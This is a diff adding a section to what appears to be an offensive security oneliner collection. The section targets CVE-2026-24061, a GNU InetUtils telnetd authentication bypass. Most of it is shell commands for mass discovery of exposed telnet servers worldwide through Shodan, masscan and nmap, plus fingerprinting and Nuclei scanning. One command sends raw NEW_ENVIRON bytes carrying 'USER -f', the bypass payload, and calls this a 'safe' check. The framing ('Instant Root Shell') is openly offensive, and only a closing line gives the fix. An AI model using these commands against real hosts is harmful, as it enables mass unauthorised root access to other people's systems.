@@ -1812,6 +1812,75 @@ screenshot() {
 
 ## 🆕 New Oneliners 2026
 
+### ⚡🔥⚡ TelnetPwn - CVE-2026-24061 (CVSS 9.8 - CRITICAL) ⚡🔥⚡
+
+> **💀 GNU InetUtils Telnetd Authentication Bypass - Instant Root Shell! Under Active Exploitation! 💀**
+
+#### ⚡ 1. Shodan Mass Telnet Discovery
+```bash
+# 💀 Find exposed telnet servers worldwide
+shodan search "port:23 telnet" --fields ip_str,port,org | awk '{print $1":"$2}' | anew telnet_targets.txt
+```
+
+#### ⚡ 2. Nmap Telnet Service Detection + Version
+```bash
+# 💀 Enumerate telnet services with version detection
+nmap -p23 -sV --script=telnet-ntlm-info -iL targets.txt -oG - | grep "23/open" | awk '{print $2}' | anew telnet_open.txt
+```
+
+#### ⚡ 3. Masscan Fast Telnet Sweep
+```bash
+# 💀 Ultra-fast telnet port discovery on large ranges
+masscan -p23 --rate=10000 -iL ip_ranges.txt -oG masscan_telnet.txt && cat masscan_telnet.txt | grep "23/open" | awk '{print $4}' | anew telnet_alive.txt
+```
+
+#### ⚡ 4. GNU InetUtils Telnetd Fingerprint
+```bash
+# 💀 Identify GNU inetutils-telnetd specifically (vulnerable)
+cat telnet_targets.txt | xargs -P30 -I@ sh -c 'echo "" | timeout 3 nc -v @ 23 2>&1 | grep -qi "GNU\|inetutils\|Ubuntu\|Debian" && echo "[GNU TELNETD] @"' | tee gnu_telnetd.txt
+```
+
+#### ⚡ 5. CVE-2026-24061 Vulnerability Check (Safe)
+```bash
+# 💀 Test for NEW_ENVIRON option support (vuln indicator)
+cat telnet_targets.txt | xargs -P20 -I@ sh -c 'echo -e "\xff\xfa\x27\x00\x00USER\x01-f\xff\xf0" | timeout 3 nc @ 23 2>/dev/null | grep -q "login\|root\|#" && echo "[CVE-2026-24061 POTENTIAL] @"' | tee cve_2026_24061_potential.txt
+```
+
+#### ⚡ 6. Nuclei CVE-2026-24061 Scanner
+```bash
+# 💀 Mass scan with Nuclei template
+cat telnet_targets.txt | nuclei -t http/cves/2026/CVE-2026-24061.yaml -c 50 -o cve_2026_24061_vuln.txt
+```
+
+#### ⚡ 7. Banner Grabbing + Version Extraction
+```bash
+# 💀 Extract telnet banners for version analysis
+cat telnet_targets.txt | xargs -P50 -I@ sh -c 'echo "" | timeout 3 nc @ 23 2>&1 | head -3' | tee telnet_banners.txt | grep -iE "(inetutils|GNU|2\.[0-7])" | anew potentially_vuln_versions.txt
+```
+
+#### ⚡ 8. Subnet Telnet Hunter
+```bash
+# 💀 Discover telnet in internal/external subnets
+prips 192.168.0.0/16 | xargs -P100 -I@ sh -c 'timeout 1 nc -zv @ 23 2>&1 | grep -q "succeeded\|open" && echo @' | anew internal_telnet.txt
+```
+
+#### ⚡ 9. Telnet + OS Fingerprint Correlation
+```bash
+# 💀 Correlate telnet with vulnerable OS (Debian/Ubuntu/Kali)
+nmap -p23 -sV -O --script=telnet-encryption -iL telnet_targets.txt -oX telnet_scan.xml && cat telnet_scan.xml | grep -oE "(Debian|Ubuntu|Kali|Linux)" | sort | uniq -c | sort -rn
+```
+
+#### ⚡ 10. Full CVE-2026-24061 Recon Pipeline
+```bash
+# 💀 Complete telnet vulnerability assessment pipeline
+TARGET_RANGE="192.168.1.0/24"; mkdir -p telnet_recon && cd telnet_recon; masscan -p23 --rate=5000 $TARGET_RANGE -oG masscan.txt; cat masscan.txt | grep "23/open" | awk '{print $4}' > telnet_hosts.txt; cat telnet_hosts.txt | xargs -P30 -I@ sh -c 'echo "" | timeout 3 nc @ 23 2>&1 | head -5' > banners.txt; grep -liE "(GNU|inetutils|ubuntu|debian)" banners.txt | xargs -I@ basename @ .txt > gnu_telnetd_hosts.txt; echo "[+] Found $(wc -l < telnet_hosts.txt) telnet | $(wc -l < gnu_telnetd_hosts.txt) GNU inetutils (potentially vulnerable)"
+```
+
+> **⚠️ Affected:** GNU InetUtils telnetd 1.9.3 - 2.7 (Debian/Ubuntu/Kali/Trisquel)
+> **✅ Fix:** Update to GNU InetUtils 2.8+ or disable telnetd and use SSH
+
+---
+
 ### ⚡🔥⚡ Ni8mare - CVE-2026-21858 (CVSS 10.0 - CRITICAL) ⚡🔥⚡
 
 > **💀 Critical Unauthenticated RCE in n8n Workflow Automation - 100,000+ servers affected! Added to CISA KEV 💀**
